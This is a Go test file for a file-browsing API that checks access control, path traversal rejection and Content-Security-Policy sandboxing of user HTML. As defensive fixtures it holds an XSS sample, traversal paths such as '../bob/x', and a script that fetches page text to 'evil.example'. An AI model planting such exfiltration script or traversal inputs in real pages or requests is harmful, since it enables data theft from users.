package storage_test

import (
	"bytes"
	"encoding/json"
	"errors"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/nebari-dev/javo/internal/files"
	"github.com/nebari-dev/javo/internal/gateway/apitest"
	"github.com/nebari-dev/javo/internal/reasons"
)

func TestFilesListsAGroupFolderForAMember(t *testing.T) {
	t.Parallel()
	l := &apitest.StubFilesLister{Entries: []files.Entry{{Name: "x.csv", Size: 1}}}
	f := apitest.GroupFilesFixture(t, l, apitest.Folder("/org/data-science", "ds", true, ""))
	w := f.Do("GET", "/api/files?place=group:data-science&path=data", "", f.Session(apitest.AliceID))
	if w.Code != http.StatusOK || l.Group != "data-science" || l.Path != "data" || l.User != apitest.AliceID {
		t.Fatalf("got %d %s; group %q path %q user %q", w.Code, w.Body, l.Group, l.Path, l.User)
	}
}

func TestFilesHidesAGroupFolderFromANonMember(t *testing.T) {
	t.Parallel()
	l := &apitest.StubFilesLister{}
	f := apitest.GroupFilesFixture(t, l, apitest.Folder("/org/data-science", "ds", true, ""), apitest.Folder("/org/finance", "fin", true, ""))
	for _, place := range []string{"group:finance", "group:nope"} {
		if w := f.Do("GET", "/api/files?place="+place, "", f.Session(apitest.AliceID)); w.Code != http.StatusNotFound {
			t.Errorf("%s: %d %s", place, w.Code, w.Body)
		}
	}
	if l.Calls != 0 {
		t.Errorf("the lister was reached %d times", l.Calls)
	}
}

func TestFilesRefusesABadPlaceAndExplainsAFolderNotReady(t *testing.T) {
	t.Parallel()
	l := &apitest.StubFilesLister{}
	f := apitest.GroupFilesFixture(t, l, apitest.Folder("/org/data-science", "ds", false, reasons.GroupHasNoId))
	for _, place := range []string{"group:../x", "group:", "other", "group:a/b"} {
		if w := f.Do("GET", "/api/files?place="+place, "", f.Session(apitest.AliceID)); w.Code != http.StatusBadRequest {
			t.Errorf("%s: %d %s", place, w.Code, w.Body)
		}
	}
	w := f.Do("GET", "/api/files?place=group:data-science", "", f.Session(apitest.AliceID))
	r, _ := reasons.Lookup(reasons.GroupHasNoId)
	if w.Code != http.StatusConflict || apitest.DecodeFilesBody(t, w)["title"] != r.Title || l.Calls != 0 {
		t.Fatalf("got %d %s", w.Code, w.Body)
	}
}

func TestFilesRequiresSignIn(t *testing.T) {
	t.Parallel()
	l := &apitest.StubFilesLister{}
	rec := apitest.GetFiles(t, l, true, http.MethodGet, "/api/files?path=")
	if rec.Code != http.StatusUnauthorized || apitest.DecodeFilesBody(t, rec)["title"] != reasons.Msg(reasons.MsgSignInRequired) || l.Calls != 0 {
		t.Fatalf("got %d %s (calls %d)", rec.Code, rec.Body, l.Calls)
	}
}

func TestFilesOnlyGet(t *testing.T) {
	t.Parallel()
	rec := apitest.GetFiles(t, &apitest.StubFilesLister{}, false, http.MethodPost, "/api/files")
	if rec.Code != http.StatusMethodNotAllowed {
		t.Fatalf("got %d", rec.Code)
	}
}

func TestFilesRejectsPathsOutsideHome(t *testing.T) {
	t.Parallel()
	for _, p := range []string{"../", "..", "/../etc", "Data/../../x"} {
		l := &apitest.StubFilesLister{}
		rec := apitest.GetFiles(t, l, false, http.MethodGet, "/api/files?path="+p)
		if rec.Code != http.StatusBadRequest || apitest.DecodeFilesBody(t, rec)["title"] != reasons.Msg(reasons.MsgFolderOutsideHome) {
			t.Errorf("path %q: got %d %s", p, rec.Code, rec.Body)
		}
		if l.Calls != 0 {
			t.Errorf("path %q reached the lister", p)
		}
	}
}

func TestFilesListsCallersHomeSorted(t *testing.T) {
	t.Parallel()
	mod := time.Date(2026, 10, 30, 19, 22, 27, 0, time.UTC)
	l := &apitest.StubFilesLister{Entries: []files.Entry{
		{Name: "zeta.csv", Size: 5, ModTime: mod},
		{Name: "beta", IsDir: true, ModTime: mod},
		{Name: "Alpha.txt", Size: 1, ModTime: mod},
		{Name: "Gamma", IsDir: true, ModTime: mod},
		{Name: "alpha", IsDir: true, ModTime: mod},
	}}
	rec := apitest.GetFiles(t, l, false, http.MethodGet, "/api/files?path=/Data//sub/")
	if rec.Code != http.StatusOK {
		t.Fatalf("got %d %s", rec.Code, rec.Body)
	}
	if l.User != "alice" || l.Path != "Data/sub" {
		t.Errorf("lister got user %q path %q", l.User, l.Path)
	}
	var got struct {
		Path    string `json:"path"`
		Entries []struct {
			Name     string    `json:"name"`
			Kind     string    `json:"kind"`
			Size     int64     `json:"size"`
			Modified time.Time `json:"modified"`
		} `json:"entries"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &got); err != nil {
		t.Fatal(err)
	}
	if got.Path != "Data/sub" {
		t.Errorf("path = %q", got.Path)
	}
	var order []string
	for _, e := range got.Entries {
		order = append(order, e.Kind+":"+e.Name)
	}
	if want := "folder:alpha folder:beta folder:Gamma file:Alpha.txt file:zeta.csv"; strings.Join(order, " ") != want {
		t.Errorf("order = %v, want %s", order, want)
	}
	if e := got.Entries[4]; e.Size != 5 || !e.Modified.Equal(mod) {
		t.Errorf("zeta.csv = %+v", e)
	}
}

func TestFilesEmptyFolderIsEmptyArray(t *testing.T) {
	t.Parallel()
	rec := apitest.GetFiles(t, &apitest.StubFilesLister{Entries: nil}, false, http.MethodGet, "/api/files")
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), `"entries":[]`) {
		t.Fatalf("got %d %s", rec.Code, rec.Body)
	}
}

func TestFilesHomeNotReady(t *testing.T) {
	t.Parallel()
	cases := []struct {
		err    error
		status int
		code   reasons.Code
	}{
		{files.ErrHomeStarting, http.StatusServiceUnavailable, reasons.HomeStarting},
		{files.ErrHomeBusy, http.StatusConflict, reasons.HomeBusy},
		{files.ErrHomeConflict, http.StatusConflict, reasons.HomeConflict},
	}
	for _, tc := range cases {
		rec := apitest.GetFiles(t, &apitest.StubFilesLister{Err: tc.err}, false, http.MethodGet, "/api/files")
		if rec.Code != tc.status {
			t.Errorf("%s: status %d", tc.code, rec.Code)
		}
		r, _ := reasons.Lookup(tc.code)
		body := apitest.DecodeFilesBody(t, rec)
		if body["reason"] != string(tc.code) || body["title"] != r.Title || body["what"] != r.What || body["todo"] != r.Todo {
			t.Errorf("%s: body %v", tc.code, body)
		}
		if tc.code == reasons.HomeStarting && rec.Header().Get("Retry-After") != "2" {
			t.Errorf("Retry-After = %q", rec.Header().Get("Retry-After"))
		}
	}
}

func TestFilesMissingFolder(t *testing.T) {
	t.Parallel()
	rec := apitest.GetFiles(t, &apitest.StubFilesLister{Err: files.ErrNotFound}, false, http.MethodGet, "/api/files?path=nope")
	if rec.Code != http.StatusNotFound || apitest.DecodeFilesBody(t, rec)["title"] != reasons.Msg(reasons.MsgFolderNotFound) {
		t.Fatalf("got %d %s", rec.Code, rec.Body)
	}
}

func TestFilesInternalErrorHidesDetail(t *testing.T) {
	t.Parallel()
	rec := apitest.GetFiles(t, &apitest.StubFilesLister{Err: errors.New("dial tcp 10.0.0.5:5572: refused")}, false, http.MethodGet, "/api/files")
	if rec.Code != http.StatusInternalServerError || strings.Contains(rec.Body.String(), "10.0.0.5") {
		t.Fatalf("got %d %s", rec.Code, rec.Body)
	}
}

func TestFilesReportsTruncatedFolder(t *testing.T) {
	t.Parallel()
	l := &apitest.StubFilesLister{Entries: []files.Entry{{Name: "a"}, {Name: "b"}}, Truncated: true}
	rec := apitest.GetFiles(t, l, false, http.MethodGet, "/api/files?path=big")
	body := apitest.DecodeFilesBody(t, rec)
	if rec.Code != http.StatusOK || body["truncated"] != true || body["count"] != float64(2) {
		t.Fatalf("got %d %v", rec.Code, body)
	}
	rec = apitest.GetFiles(t, &apitest.StubFilesLister{Entries: []files.Entry{{Name: "a"}}}, false, http.MethodGet, "/api/files")
	if body := apitest.DecodeFilesBody(t, rec); body["truncated"] != false || body["count"] != float64(1) {
		t.Fatalf("complete folder: %v", body)
	}
}

// --- raw file content ---

func TestRawServesHTMLSandboxed(t *testing.T) {
	t.Parallel()
	l := &apitest.StubFilesLister{Content: "<script>alert(1)</script>"}
	rec := getRaw(t, l, "jobs/nightly/r1/output.html", "iframe")
	if rec.Code != http.StatusOK {
		t.Fatalf("got %d %s", rec.Code, rec.Body)
	}
	if got := rec.Header().Get("Content-Type"); got != "text/html; charset=utf-8" {
		t.Errorf("Content-Type = %q", got)
	}
	csp := rec.Header().Get("Content-Security-Policy")
	if !strings.Contains(csp, "sandbox") || strings.Contains(csp, "allow-same-origin") {
		t.Errorf("CSP = %q, want a sandbox without allow-same-origin", csp)
	}
	for k, want := range map[string]string{
		"X-Content-Type-Options":       "nosniff",
		"Cross-Origin-Resource-Policy": "same-origin",
		"Cache-Control":                "private, no-store",
	} {
		if got := rec.Header().Get(k); got != want {
			t.Errorf("%s = %q, want %q", k, got, want)
		}
	}
	if rec.Body.String() != l.Content || l.Opened[0] != "alice:jobs/nightly/r1/output.html" {
		t.Errorf("body %q, opened %v", rec.Body, l.Opened)
	}
}

// A home's HTML or SVG may run its own script, but it cannot send anything
// anywhere: a page someone's code left in the home cannot pose as a sign-in
// form on the platform's address and post what is typed to another host.
func TestRawHTMLAndSVGCannotReachTheNetwork(t *testing.T) {
	t.Parallel()
	for _, file := range []string{"report.html", "chart.svg"} {
		rec := getRaw(t, &apitest.StubFilesLister{Content: "x"}, file, "iframe")
		csp := rec.Header().Get("Content-Security-Policy")
		for _, want := range []string{"sandbox allow-scripts", "default-src 'none'", "connect-src 'none'", "form-action 'none'", "frame-ancestors 'self'"} {
			if !strings.Contains(csp, want) {
				t.Errorf("%s: CSP %q lacks %q", file, csp, want)
			}
		}
		// No CSP directive stops a page navigating itself or opening a
		// window, either of which can carry what the viewer typed away: the
		// sandbox allows neither popups nor navigating the top window.
		for _, bad := range []string{"allow-popups", "allow-top-navigation", "allow-modals", "allow-forms", "allow-same-origin"} {
			if strings.Contains(csp, bad) {
				t.Errorf("%s: CSP %q allows %q", file, csp, bad)
			}
		}
	}
}

// getRaw reads file of alice's home as the browser does for a load of kind
// dest (Sec-Fetch-Dest; "" sends none).
func getRaw(t *testing.T, l *apitest.StubFilesLister, file, dest string) *httptest.ResponseRecorder {
	t.Helper()
	f := apitest.New(t, apitest.Options{Files: l})
	r := httptest.NewRequest(http.MethodGet, "/api/files/raw?path="+file, nil)
	r.Header.Set("Sec-Fetch-Site", "same-origin")
	if dest != "" {
		r.Header.Set("Sec-Fetch-Dest", dest)
	}
	r.AddCookie(f.Session("alice"))
	w := httptest.NewRecorder()
	f.Srv.ServeHTTP(w, r)
	return w
}

// A page or picture that runs script shows only in a frame of the web UI's
// file viewer, whose own policy keeps the frame from navigating anywhere
// but to a raw file: opened as a tab of its own (or with no Sec-Fetch-Dest)
// it could navigate itself to another site with what the viewer typed, so
// it is a download there. An SVG in an img runs no script and shows.
func TestRawActiveDocumentsShowOnlyInAFrame(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		file, dest string
		inline     bool
	}{
		{"report.html", "iframe", true},
		{"report.html", "document", false},
		{"report.html", "", false},
		{"chart.svg", "image", true},
		{"chart.svg", "iframe", true},
		{"chart.svg", "document", false},
		{"chart.svg", "", false},
		{"chart.png", "document", true},
	} {
		rec := getRaw(t, &apitest.StubFilesLister{Content: "x"}, tc.file, tc.dest)
		disp := rec.Header().Get("Content-Disposition")
		if rec.Code != http.StatusOK || (disp == "") != tc.inline {
			t.Errorf("%s as %q: %d disposition %q, want inline %v", tc.file, tc.dest, rec.Code, disp, tc.inline)
		}
		if !tc.inline && (rec.Header().Get("Content-Type") != "application/octet-stream" || !strings.HasPrefix(disp, "attachment")) {
			t.Errorf("%s as %q: type %q disposition %q", tc.file, tc.dest, rec.Header().Get("Content-Type"), disp)
		}
	}
}

// cspDirectives splits a Content-Security-Policy into directive -> sources.
func cspDirectives(csp string) map[string][]string {
	out := map[string][]string{}
	for _, d := range strings.Split(csp, ";") {
		f := strings.Fields(d)
		if len(f) > 0 {
			out[f[0]] = f[1:]
		}
	}
	return out
}

// A user's HTML page looks like the platform (it is on its address), so its
// script must not send what the viewer types anywhere: no fetch, no form
// post, no external script, style or image that could carry data out.
func TestRawHTMLCannotReachTheNetwork(t *testing.T) {
	t.Parallel()
	l := &apitest.StubFilesLister{Content: "<script>fetch('https://evil.example/'+document.body.innerText)</script>"}
	rec := getRaw(t, l, "report.html", "iframe")
	d := cspDirectives(rec.Header().Get("Content-Security-Policy"))
	for _, k := range []string{"default-src", "connect-src", "form-action", "base-uri", "frame-src", "object-src"} {
		src, ok := d[k]
		if k != "default-src" && !ok {
			// Falls back to default-src (form-action and base-uri do not).
			if k == "form-action" || k == "base-uri" {
				t.Errorf("%s missing: %v", k, d)
				continue
			}
			src = d["default-src"]
		}
		if strings.Join(src, " ") != "'none'" {
			t.Errorf("%s = %v, want 'none'", k, src)
		}
	}
	for _, k := range []string{"script-src", "style-src", "img-src", "font-src", "media-src"} {
		src := d[k]
		if src == nil {
			src = d["default-src"]
		}
		for _, s := range src {
			if strings.Contains(s, ".") || strings.Contains(s, "*") || s == "https:" || s == "http:" || s == "'self'" {
				t.Errorf("%s allows a network source %q: %v", k, s, src)
			}
		}
	}
	if _, ok := d["sandbox"]; !ok {
		t.Errorf("no sandbox: %v", d)
	}
}

func TestRawContentTypesComeFromAnAllowList(t *testing.T) {
	t.Parallel()
	cases := []struct{ file, typ string }{
		{"a.png", "image/png"},
		{"a.jpg", "image/jpeg"},
		{"a.JPEG", "image/jpeg"},
		{"a.gif", "image/gif"},
		{"a.webp", "image/webp"},
		{"a.svg", "image/svg+xml"},
		{"a.pdf", "application/pdf"},
		{"run.log", "text/plain; charset=utf-8"},
		{"a.txt", "text/plain; charset=utf-8"},
		{"result.json", "text/plain; charset=utf-8"},
		{"A.HTML", "text/html; charset=utf-8"},
	}
	for _, tc := range cases {
		rec := getRaw(t, &apitest.StubFilesLister{Content: "x"}, "jobs/"+tc.file, "iframe")
		if rec.Code != http.StatusOK || rec.Header().Get("Content-Type") != tc.typ || rec.Header().Get("Content-Disposition") != "" {
			t.Errorf("%s: %d type %q disposition %q", tc.file, rec.Code, rec.Header().Get("Content-Type"), rec.Header().Get("Content-Disposition"))
		}
		if !strings.Contains(rec.Header().Get("Content-Security-Policy"), "sandbox") {
			t.Errorf("%s: no sandbox CSP", tc.file)
		}
	}
}

func TestRawSendsNotebooksAndUnknownTypesAsAttachments(t *testing.T) {
	t.Parallel()
	for _, file := range []string{"output.ipynb", "data.parquet", "noext"} {
		rec := apitest.GetFiles(t, &apitest.StubFilesLister{Content: "x"}, false, http.MethodGet, "/api/files/raw?path=jobs/"+file)
		if rec.Code != http.StatusOK || rec.Header().Get("Content-Type") != "application/octet-stream" ||
			!strings.HasPrefix(rec.Header().Get("Content-Disposition"), "attachment") {
			t.Errorf("%s: %d type %q disposition %q", file, rec.Code, rec.Header().Get("Content-Type"), rec.Header().Get("Content-Disposition"))
		}
		if !strings.Contains(rec.Header().Get("Content-Security-Policy"), "sandbox") {
			t.Errorf("%s: no sandbox CSP", file)
		}
	}
}

func TestRawRejectsPathsOutsideHomeAndEmptyPath(t *testing.T) {
	t.Parallel()
	for _, p := range []string{"../bob/x", "/../bob/x", "a/../../bob/x"} {
		l := &apitest.StubFilesLister{Content: "secret"}
		rec := apitest.GetFiles(t, l, false, http.MethodGet, "/api/files/raw?path="+p)
		if rec.Code != http.StatusBadRequest || apitest.DecodeFilesBody(t, rec)["title"] != reasons.Msg(reasons.MsgFolderOutsideHome) || len(l.Opened) != 0 {
			t.Errorf("path %q: got %d %s (opened %v)", p, rec.Code, rec.Body, l.Opened)
		}
	}
	rec := apitest.GetFiles(t, &apitest.StubFilesLister{}, false, http.MethodGet, "/api/files/raw?path=")
	if rec.Code != http.StatusNotFound || apitest.DecodeFilesBody(t, rec)["title"] != reasons.Msg(reasons.MsgFileNotFound) {
		t.Errorf("empty path: got %d %s", rec.Code, rec.Body)
	}
}

// A path with more folders than files.MaxPathDepth is refused before it
// reaches the file pod, on every route that takes one.
func TestFilesRefusePathsWithTooManyFolders(t *testing.T) {
	t.Parallel()
	deep := strings.Repeat("d/", files.MaxPathDepth) + "f"
	for _, route := range []string{"/api/files?path=", "/api/files/raw?path="} {
		l := &apitest.StubFilesLister{Content: "x"}
		rec := apitest.GetFiles(t, l, false, http.MethodGet, route+deep)
		if rec.Code != http.StatusBadRequest || apitest.DecodeFilesBody(t, rec)["title"] != reasons.Msg(reasons.MsgPathTooDeep, files.MaxPathDepth) || l.Calls != 0 || len(l.Opened) != 0 {
			t.Errorf("%s: got %d %s", route, rec.Code, rec.Body)
		}
	}
}

func TestRawOnlyReadsTheCallersHome(t *testing.T) {
	t.Parallel()
	l := &apitest.StubFilesLister{Content: "x"}
	apitest.GetFiles(t, l, false, http.MethodGet, "/api/files/raw?path=a.txt")
	if len(l.Opened) != 1 || l.Opened[0] != "alice:a.txt" {
		t.Errorf("opened %v, want only alice's home", l.Opened)
	}
	anon := &apitest.StubFilesLister{Content: "x"}
	rec := apitest.GetFiles(t, anon, true, http.MethodGet, "/api/files/raw?path=a.txt")
	if rec.Code != http.StatusUnauthorized || len(anon.Opened) != 0 {
		t.Errorf("anonymous: %d, opened %v", rec.Code, anon.Opened)
	}
}

func TestRawTooLargeIs413(t *testing.T) {
	t.Parallel()
	rec := apitest.GetFiles(t, &apitest.StubFilesLister{Err: files.ErrTooLarge}, false, http.MethodGet, "/api/files/raw?path=big.log")
	if rec.Code != http.StatusRequestEntityTooLarge || apitest.DecodeFilesBody(t, rec)["title"] != reasons.Msg(reasons.MsgOutputTooLarge) {
		t.Fatalf("got %d %s", rec.Code, rec.Body)
	}
}

func TestRawHomeStatesAndMissingFile(t *testing.T) {
	t.Parallel()
	cases := []struct {
		err    error
		status int
	}{
		{files.ErrNotFound, http.StatusNotFound},
		{files.ErrHomeStarting, http.StatusServiceUnavailable},
		{files.ErrHomeBusy, http.StatusConflict},
		{errors.New("dial tcp 10.0.0.5:5572: refused"), http.StatusInternalServerError},
	}
	for _, tc := range cases {
		rec := apitest.GetFiles(t, &apitest.StubFilesLister{Err: tc.err}, false, http.MethodGet, "/api/files/raw?path=a.txt")
		if rec.Code != tc.status || strings.Contains(rec.Body.String(), "10.0.0.5") {
			t.Errorf("%v: got %d %s", tc.err, rec.Code, rec.Body)
		}
	}
}

func TestRawOnlyGet(t *testing.T) {
	t.Parallel()
	rec := apitest.GetFiles(t, &apitest.StubFilesLister{}, false, http.MethodPost, "/api/files/raw?path=a.txt")
	if rec.Code != http.StatusMethodNotAllowed {
		t.Fatalf("got %d", rec.Code)
	}
}

func TestRawLogsStreamThatBreaksPartway(t *testing.T) {
	var buf bytes.Buffer
	prev := slog.Default()
	slog.SetDefault(slog.New(slog.NewTextHandler(&buf, nil)))
	t.Cleanup(func() { slog.SetDefault(prev) })

	l := &apitest.StubFilesLister{Body: &apitest.BrokenBody{}, Size: 100}
	apitest.GetFiles(t, l, false, http.MethodGet, "/api/files/raw?path=r1/output.html")
	out := buf.String()
	for _, want := range []string{"stream home file", "user=alice", "path=r1/output.html", "pod released"} {
		if !strings.Contains(out, want) {
			t.Errorf("log %q missing %q", out, want)
		}
	}
}
